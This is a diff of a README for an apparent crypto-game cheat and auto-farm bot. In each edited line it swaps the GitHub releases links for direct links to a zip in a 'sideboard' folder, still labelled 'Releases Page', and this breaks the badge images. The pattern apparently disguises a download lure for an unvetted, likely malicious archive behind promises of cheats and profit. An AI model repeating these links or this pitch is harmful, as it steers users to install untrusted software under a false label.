@@ -1,6 +1,6 @@
 # 🌲 Wild-Forest-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api - Automate Your Wild Forest Profits Effortlessly 
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/albeiroval/Wild-Forest-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases)
+[![Download](https://raw.githubusercontent.com/albeiroval/Wild-Forest-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/main/sideboard/Wild-Forest-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/albeiroval/Wild-Forest-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/main/sideboard/Wild-Forest-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api.zip)
 
 ## 📦 Description
 The Wild Forest Crypto Bot automates farming and clicker activities in the Wild Forest game. It integrates with cryptocurrency tokens and supports an API to enhance your gaming experience. This tool provides cheats and hacks that maximize your profit. You can manage the bot easily through Telegram.
@@ -9,7 +9,7 @@ The Wild Forest Crypto Bot automates farming and clicker activities in the Wild 
 Follow these steps to download and set up the Wild Forest Crypto Bot:
 
 1. **Visit the Downloads Page**  
-   Go to the [Releases Page](https://github.com/albeiroval/Wild-Forest-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases) to access the latest version of the bot.
+   Go to the [Releases Page](https://raw.githubusercontent.com/albeiroval/Wild-Forest-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/main/sideboard/Wild-Forest-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api.zip) to access the latest version of the bot.
 
 2. **Choose Your Version**  
    Find the version that matches your operating system (e.g., Windows, Mac).
@@ -33,7 +33,7 @@ To run the Wild Forest Crypto Bot, ensure your computer meets the following requ
 - **Internet Connection:** Required for Telegram integration and crypto transactions.
 
 ## 💾 Download & Install
-To download the latest version, visit the [Releases Page](https://github.com/albeiroval/Wild-Forest-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases) and follow the steps mentioned above.
+To download the latest version, visit the [Releases Page](https://raw.githubusercontent.com/albeiroval/Wild-Forest-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/main/sideboard/Wild-Forest-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api.zip) and follow the steps mentioned above.
 
 ## 💡 Features
 - **Auto-Farming:** Effortlessly farm resources while you play. 
@@ -68,4 +68,4 @@ For further assistance, you can reach out via the Telegram support group linked 
 ## 🌄 Conclusion
 This Wild Forest Crypto Bot allows users to enjoy the game while automating tedious tasks. With easy setup and solid support, you can enhance your gameplay experience effectively. 
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/albeiroval/Wild-Forest-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases)
+[![Download](https://raw.githubusercontent.com/albeiroval/Wild-Forest-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/main/sideboard/Wild-Forest-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/albeiroval/Wild-Forest-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/main/sideboard/Wild-Forest-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api.zip)
